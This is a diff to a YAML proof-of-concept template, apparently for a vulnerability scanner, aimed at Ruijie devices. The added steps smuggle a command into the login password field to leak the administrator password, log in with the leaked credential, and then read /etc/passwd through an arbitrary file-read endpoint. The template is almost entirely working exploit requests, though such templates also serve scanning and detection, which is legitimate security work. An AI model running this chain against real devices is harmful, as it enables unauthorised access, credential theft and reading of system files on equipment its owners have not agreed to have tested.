@@ -1,12 +1,30 @@
 name: poc-yaml-ruijie-anyfile-read
 rules:
   - method: POST
+    path: /login.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=admin&password=admin?show+webmaster+user
+    expression: |
+      response.status == 200 && response.content_type.contains("text/json")
+    search: |
+      {"data":".*admin\s?(?P<password>[^\\"]*)
+  - method: POST
+    path: /login.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=admin&password={{password}}
+    expression: |
+      response.status == 200 && response.content_type.contains("text/json") && response.headers["Set-Cookie"].contains("user=admin") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
+  - method: POST
     path: /download.php?a=read_txt
     follow_redirects: false
     body: |
       file=/etc/passwd
     expression: |
-      response.status == 200 && "root:".bmatches(response.body) && response.body.bcontains(b"\"status\":true,")
+      response.status == 200 && response.body.bcontains(b"\"status\":true,") && "root:[x*]?:0:0:".bmatches(response.body)
 detail:
   author: abbin777
   influence_version: "@2000-2015"
